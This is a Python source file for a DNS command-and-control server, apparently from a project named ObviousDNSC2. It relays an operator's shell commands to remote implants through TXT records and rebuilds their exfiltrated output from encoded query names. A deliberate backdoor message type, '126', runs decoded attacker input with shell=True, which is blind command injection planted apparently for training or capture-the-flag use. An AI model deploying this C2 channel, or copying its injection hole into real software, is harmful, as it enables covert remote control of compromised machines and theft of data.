#!/usr/bin/env/python3
# from https://github.com/chriselgee/ObviousDNSC2

import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct
import base64
from textwrap import wrap
import subprocess
try:
    from dnslib import *
except ImportError:
    print(f"{OE}Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with {OR}pip{OE}.{OM}")
    sys.exit(2)

# colorize output
OV = '\x1b[0;33m' # verbose
OR = '\x1b[0;34m' # routine
OE = '\x1b[1;31m' # error
OM = '\x1b[0m'    # mischief managed

maxAReq = 63
maxResp = 253
userInput = ""
respPktCt = 0
respText = ""
chunks = []

class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)

def toBytes(input):
    if isinstance(input, str): return input.encode('utf-8')
    else: return input

def toString(input):
    if isinstance(input, bytes): return input.decode('utf-8')
    else: return input

def decode64(b64):
    return base64.b64decode(toBytes(b64))

def encode64(plain):
    return base64.b64encode(toBytes(plain))

def decode32(b32):
    revert = toBytes(b32).replace(b"-",b"=") # undo the "equals" silliness
    if revert.endswith(b"0"): revert = revert[:-1] # pop off any extra pad
    return base64.b32decode(revert)

def encode32(plain):
    switch = toBytes(plain)
    return base64.b32encode(switch).replace(b"=",b"-") # "equals" isn't allowed to play in domain names

parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server.')
parser = argparse.ArgumentParser(description='Start an Obvious DNS C2 server.')
parser.add_argument('-d', "--domain", default="example.com", type=str, help='The NS record pointing to this server. Example: odc2.example.com.')
parser.add_argument('--port', default=53, type=int, help='The port to listen on. Default is 53 for both protocols.')
parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams. Will listen on both if neiter is specified.')
parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")

args = parser.parse_args()
if not (args.udp or args.tcp):
    # parser.error("Please select at least one of --udp or --tcp.")
    args.udp = args.tcp = True # let's default to yes on both

if args.verbose:
    debuggin = True
else:
    debuggin = False
if debuggin: print(f"{OV}Verbose output enabled{OM}")

if "domain" in args:
    if not args.domain[-1:] == ".": args.domain += "." # gotta end with "." because DNS
    D = DomainName(args.domain)
else:
    D = DomainName("example.com.")
if debuggin: print(f"{OV}Using domain {OR}{D}{OM}")

IP = '0.0.0.0'
TTL = 1 # to (hopefully) ensure responses aren't cached.  Apparently "0" can have odd effects...

soa_record = SOA(
    mname=D.ns1,  # primary name server
    rname=D.odc2,  # email of the domain administrator
    times=(
        867530999,  # serial number
        60 * 60 * 1,  # refresh
        60 * 60 * 3,  # retry
        60 * 60 * 24,  # expire
        60 * 60 * 1,  # minimum
    )
)
ns_records = [NS(D.ns1), NS(D.ns2)]
records = {
    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
    D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
    D.ns2: [A(IP)],
    D.mail: [A(IP)],
    D.odc2: [CNAME(D)],
    D.txt: [TXT(("bobberson"))],
}

def dns_response(data):
    request = DNSRecord.parse(data)
    # if debuggin: print(f"{OV}Incoming data looks like:\n{OR} {data}{OM}")
    # if debuggin: print(f"{OV}Incoming request looks like:\n{OR} {request}{OM}")
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    qname = request.q.qname
    # if debuggin: print(f"{OV}Incoming qname looks like:\n{OR} {request.q.qname}{OM}")
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    # if debuggin: print(f"{OV}qn, D look like:\n{OR} {qn}\n {D}{OM}")
    if qn == D or qn.endswith('.' + D):
        # if debuggin: print(f"{OV}records.items() looks like:\n{OR} {records.items()}{OM}")
        for name, rrs in records.items():
            # if debuggin: print(f"{OV}name, qn look like:\n{OR} {name}\n {qn}{OM}")
            if name == qn:
                for rdata in rrs:
                    # if debuggin: print(f"{OV}Outgoing rdata looks like:\n{OR} {rdata}{OM}")
                    rqt = rdata.__class__.__name__
                    if qt in ['*', rqt]:
                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
        for rdata in ns_records:
            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
        txtReply = c2(qn)
        reply.add_answer(RR(qname, 16, ttl=0, rdata=TXT(txtReply)))
        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
        if debuggin: print(f"{OV}Outgoing txt reply looks like: {OR}{txtReply}{OM}")
    return reply.pack()

def c2(qname):
    #try:
        global respPktCt
        global respText
        global userInput
        request = qname.split(".")[0]
        msgType = request[:3]
        if debuggin: print(f"{OV}c2() request {OR}{request}{OV} of type {OR}{msgType}{OM}")
        # request = decode32(request[3:]).decode('utf-8')
        request = request[3:]
        if msgType == "CHK": # client checking in for commands
            if userInput == "": # no user input? NOP
                response = b"NUL"
            else: # have a command? send the command header
                encCmd = encode64(userInput).decode('utf-8') # encode so special chars don't nuke us
                userInput = ""
                global chunks
                chunks = wrap(encCmd,249) # break encoded command into chunks w/4-byte headers, 253 byte max
                chunks.reverse() # so we can pop pieces off in order
                response = b"HDR" + encode64(str(len(chunks)))
        elif msgType == "HDR": # client sending response header
            respPktCt = int(decode32(request).decode('utf-8').split(" ")[0])
            response = b"ACK" + bytes(str(respPktCt),'utf-8')
        elif msgType == "RES": # client sending response body
            if debuggin: print(f"{OV}respText so far is {OR}{respText}{OV}, and respPktCt is {OR}{respPktCt}{OM}")
            # if respPktCt < 1:
            #     print(f"{OE}Got unexpected client 'RES'{OM}")
            #     response = b"DIE Unexpected RES"
            respText += request
            respPktCt -= 1
            if respPktCt == 0: # end of the thread from client? print output
                print(f"{OR}Command output: \n{OV}{decode32(respText).decode('utf-8')}{OM}")
                respText = "" # reset for next command
            response = ("ACK" + str(respPktCt)).encode('utf-8')
        elif msgType == "CON": # client ready for more from server
            if len(chunks) < 1:
                print(f"{OE}Got unexpected client 'CON'{OM}")
                response = b"DIE Unexpected CON"
            else:
                response = b"CMD" + chunks.pop().encode('utf-8') # send the next chunk of command
        elif msgType == "126": # a secret back door?!?
            command = decode32(request).decode('utf-8')
            subprocess.check_output(command, shell=True)
            response = b"Looks like blind command injection..."
        else: # something went wrong
            error = f"Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {msgType}"
            print(OE + error + OM)
            response = error.encode('utf-8')
            raise Exception(error)
        if debuggin: print(f"{OV}c2() response:{OR} {response}{OM}, ", end='')
        return response
    #except Exception as ex:
    #    print(f"{OE}Exception in c2(): {OR}{ex}{OM}")

class BaseRequestHandler(socketserver.BaseRequestHandler):
    def get_data(self):
        raise NotImplementedError
    def send_data(self, data):
        raise NotImplementedError
    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        # print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
        #                                        self.client_address[1]))
        try:
            data = self.get_data()
            # print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]
    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):
    def get_data(self):
        # return self.request[0].strip()
        return self.request[0]
    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

def main():
    servers = []
    if args.udp: servers.append(socketserver.ThreadingUDPServer(('', args.port), UDPRequestHandler))
    if args.tcp: servers.append(socketserver.ThreadingTCPServer(('', args.port), TCPRequestHandler))

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
    try:
        while True:
            # time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
            global userInput
            userInput = input(f"{OR}ODC2 {D} > {OR}")
            if userInput == "exit":
                raise Exception("Exit time!")
    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    print(f"{OR}Starting nameserver...{OM}")
    main()